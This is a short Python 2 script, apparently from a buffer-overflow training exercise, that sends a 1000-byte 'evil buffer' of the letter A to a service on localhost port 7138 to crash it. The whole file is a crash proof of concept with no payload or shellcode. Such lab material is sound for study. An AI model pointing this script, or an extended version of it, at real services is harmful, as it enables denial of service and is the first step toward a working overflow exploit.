#!/usr/bin/python
import socket

try:
    print "\nSending evil buffer..."
    buffer = "A" * 1000
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 7138))
    s.send(buffer)
    s.close()
    print "\nDone!"
except:
    print "\nCould not connect!"
